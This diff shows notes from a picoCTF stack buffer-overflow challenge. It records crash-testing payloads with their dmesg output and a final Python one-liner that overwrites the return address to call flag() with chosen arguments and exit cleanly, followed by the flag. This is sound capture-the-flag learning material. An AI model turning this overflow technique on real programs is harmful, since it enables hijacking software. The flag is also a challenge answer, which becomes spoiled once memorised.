@@ -26,28 +26,45 @@ if (arg2 != 0xC0DED00D)
 
 * need input like:
 
-buffer + address + arg1 + arg2
+    buffer + &flag() + address +  arg1 + arg2
 
 
-* trial and error
+* trial and error locally
 
-python 'print "a"*176 + "b"*8' | ./vuln
+    python -c 'print "a"*176' | ./vuln; dmesg | tail -1
+    [49811.940183] vuln[12246]: segfault at 65656565 ip 0000000065656565 sp 00000000ffffced0 error 14
 
-Segmentation fault (core dumped)
+    python -c 'print "a"*176 + "bbbb"' | ./vuln; dmesg | tail -1
+    [50062.107345] traps: vuln[12355] trap invalid opcode ip:8048700 sp:ffffced0 error:0 in vuln[8048000+1000]
 
-????
+    python -c 'print "a"*176 + "bbbb" + "cccc" + "dddd"' | ./vuln; dmesg | tail -1
+    Illegal instruction (core dumped)
+    [49810.373059] traps: vuln[12241] trap invalid opcode ip:8048700 sp:ffffced0 error:0 in vuln[8048000+1000]
 
-local running and use dmesg
-
-python -c 'print "a"*176 +  "\xe6\x85\x04\x08" + "\xef\xbe\xad\xde" + "\x0d\xd0\xde\xc0"' | ./vuln
-[21838.153546] traps: v[20794] trap invalid opcode ip:8048700 sp:ffcd4030 error:0 in v[8048000+1000]
-
-
-python -c 'print "a"*180 +  "\xe6\x85\x04\x08" + "\xef\xbe\xad\xde" + "\x0d\xd0\xde\xc0"' | ./vuln
-[22019.513828] v[20856]: segfault at c0ded00d ip 00000000c0ded00d sp 00000000ffcabe20 error 14
+    python -c 'print "a"*176 + "bbbb" + "cccc" + "dddd" + "eeee"' | ./vuln; dmesg | tail -1
+    Segmentation fault (core dumped)
+    [49811.940183] vuln[12246]: segfault at 65656565 ip 0000000065656565 sp 00000000ffffced0 error 14
 
 
-python -c 'print "a"*188 +  "\xe6\x85\x04\x08" + "\xef\xbe\xad\xde" + "\x0d\xd0\xde\xc0"' | ./vuln
-[22837.181091] vuln[21305]: segfault at deadbeef ip 00000000deadbeef sp 00000000ffe12d94 error 14
+needs extra 12 bytes before can change eip
+so input like:
 
+    'a'*188 + &flag() + addr + arg1 + arg2
+
+    python -c 'print "a"*188 +  "\xe6\x85\x04\x08" + "bbbb" + "\xef\xbe\xad\xde" + "\x0d\xd0\xde\xc0"' | ./vuln
+    prints flag, then
+    Segmentation fault (core dumped)
+
+clean inject with exit
+
+    exit address
+    8048631:	e8 3a fe ff ff       	call   8048470 <exit@plt>
+
+    python -c 'print "a"*188 +  "\xe6\x85\x04\x08" + "\x31\x86\x04\x08" + "\xef\xbe\xad\xde" + "\x0d\xd0\xde\xc0"' | ./vuln
+
+    prints flag and exits, no crash
+
+----------------------------------------
+
+picoCTF{arg5_and_r3turn5ce5cf61a}
 
